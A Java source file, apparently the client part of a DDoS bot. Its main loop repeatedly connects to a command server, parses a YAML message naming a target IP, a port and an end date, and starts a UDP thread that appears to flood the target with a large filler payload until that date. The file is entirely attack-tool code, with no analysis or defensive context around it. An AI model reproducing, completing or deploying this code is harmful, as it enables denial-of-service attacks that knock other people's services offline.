package com.zhanyingwl.www;

import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import static java.lang.Thread.sleep;

/**
 * @ClassName : doConnect
 * @Description : 启动类
 * @Author : 战鹰
 * @Version: 2.0
 */

public class doDCRun extends Thread {
    public static volatile boolean stop;

    static Socket socket;
    static String getInfo;
    static String endDate;
    static String ip;
    static String port;
    static int threadLock = 0; // 线程锁 防止每秒增加一个线程
    static Yaml yml = new Yaml();
    static String UDPData = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";

    public static void main(String[] args) {

        while (true) {
            try {
                socket = new Socket(InetAddress.getByName("192.168.1.1"), 8090); // 这是客户端 获取之后直接转换为yml和map
                DateFormat sdf = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzz yyyy", Locale.ENGLISH);
                InputStream inputStream = socket.getInputStream();
                byte[] bytes = new byte[1024];
                int changdu = inputStream.read(bytes);
                getInfo = new String(bytes, 0, changdu);
                Map targetInfo = yml.load(getInfo); // 把String转换为yml形式的map
                ip = targetInfo.get("ip").toString();
                port = targetInfo.get("port").toString();
                endDate = targetInfo.get("endDate").toString();
                Date fEndDate = sdf.parse(endDate);
                Date now = new Date();
                if (!now.after(fEndDate)) {
                    if (threadLock == 0) { // 线程没上锁 说明单线程尚未创建
                        stop = false;
                        udpThread udpThread = new udpThread();
                        udpThread.start();
                        threadLock = 1;
                    }
                } else if (now.after(fEndDate)) {
                    stop = true;
                }
                sleep(1000);
            } catch (IOException | InterruptedException | ParseException e) {
                e.printStackTrace();
                System.out.println("系统错误！");
            }
        }
    }

}